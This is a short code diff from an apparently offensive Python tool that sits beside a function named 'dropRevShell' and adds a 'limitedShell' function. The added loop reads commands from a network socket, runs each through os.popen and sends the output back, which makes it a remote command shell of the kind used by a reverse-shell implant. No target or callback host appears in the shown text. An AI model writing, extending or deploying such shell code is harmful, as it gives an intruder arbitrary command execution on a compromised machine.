@@ -25,3 +25,19 @@ def dropRevShell(con):
     except:
         con.sendall(b'Could Not Retrieve Data')
 
+
+def limitedShell(con):
+    while True:
+        con.sendall(b'type in command:')
+        cmd = con.recv(2048)
+        try:
+            cmd = str(cmd.decode().strip())
+            stdoutt = os.popen(cmd).read()
+            con.sendall(stdoutt.encode())
+        except ValueError:
+            con.sendall(b'Please only send valid input')
+        except KeyboardInterrupt:
+            sys.exit(0)
+        except:
+            con.sendall(b'Could Not Retrieve Data')
+
